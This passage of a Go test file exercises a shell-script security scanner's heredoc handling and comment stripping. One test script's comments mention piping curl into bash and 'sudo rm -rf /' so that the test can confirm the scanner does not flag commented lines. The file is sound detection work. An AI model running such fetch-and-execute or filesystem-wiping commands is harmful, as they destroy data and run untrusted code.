	matches := ps.MatchAllWithProtectedLines([]byte(script), protected)

	var foundSS001 bool
	for _, m := range matches {
		if m.Pattern.ID == "SS001" {
			foundSS001 = true
			break
		}
	}
	if !foundSS001 {
		t.Fatal("expected SS001 match inside heredoc content")
	}
}

func TestStripCommentsWithProtectedLines_HeredocFixtures(t *testing.T) {
	fixtures := []struct {
		name            string
		path            string
		expectedContent string
	}{
		{
			name:            "basic heredoc",
			path:            filepath.Join("..", "..", "testdata", "benign", "heredoc", "basic-heredoc.sh"),
			expectedContent: "# This line starts with hash but is heredoc content",
		},
		{
			name:            "tab stripped heredoc",
			path:            filepath.Join("..", "..", "testdata", "benign", "heredoc", "tab-stripped-heredoc.sh"),
			expectedContent: "\t\t# This hash line is heredoc content",
		},
		{
			name:            "quoted delimiter",
			path:            filepath.Join("..", "..", "testdata", "benign", "heredoc", "quoted-delimiter.sh"),
			expectedContent: "# Hash-prefixed content",
		},
	}

	for _, tc := range fixtures {
		t.Run(tc.name, func(t *testing.T) {
			content, err := os.ReadFile(tc.path)
			if err != nil {
				t.Fatalf("failed to read fixture: %v", err)
			}

			parsed, err := parser.Parse(content, tc.path, parser.DefaultOptions())
			if err != nil {
				t.Fatalf("parse error: %v", err)
			}

			var protected []LineRange
			for _, r := range parser.FindHeredocs(parsed.File) {
				protected = append(protected, LineRange{StartLine: r.StartLine, EndLine: r.EndLine})
			}
			if len(protected) == 0 {
				t.Fatal("expected fixture to contain at least one heredoc")
			}

			filtered := stripCommentsWithProtectedLines(content, protected)
			if !strings.Contains(string(filtered), tc.expectedContent) {
				t.Fatalf("expected heredoc content to be preserved: %q", tc.expectedContent)
			}
		})
	}
}

func TestCommentStripping_NoFalsePositives(t *testing.T) {
	ps := BuiltinPatterns()

	// Script that previously caused false positives
	script := `#!/bin/bash
# This script uses curl | bash to install - DON'T DO THIS
# sudo rm -rf / would be dangerous
# See: https://example.com for curl usage
echo "safe script"
`

	matches := ps.MatchAll([]byte(script))

	// Should only match SS020 (curl in the comment about usage)
	// Actually, all lines are comments now, so no matches except potentially shebang
	for _, m := range matches {
		// SS001, SS006, SS010 should NOT match (they were in comments)
		if m.Pattern.ID == "SS001" || m.Pattern.ID == "SS006" || m.Pattern.ID == "SS010" {
			t.Errorf("unexpected match %s on line %d (should be filtered as comment)",
				m.Pattern.ID, m.Line)
		}
	}
}

// BenchmarkMatchAll benchmarks pattern matching performance.
func BenchmarkMatchAll(b *testing.B) {
	ps := BuiltinPatterns()

	// Generate a moderately complex script
	var sb strings.Builder
	sb.WriteString("#!/bin/bash\n")
	for i := 0; i < 100; i++ {
		sb.WriteString(fmt.Sprintf("echo 'line %d'\n", i))
		if i%10 == 0 {
			sb.WriteString("curl https://example.com/file.tar.gz -o file.tar.gz\n")
		}
		if i%20 == 0 {
			sb.WriteString("export PATH=/opt/bin:$PATH\n")
		}
	}

	content := []byte(sb.String())

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ps.MatchAll(content)
	}
}
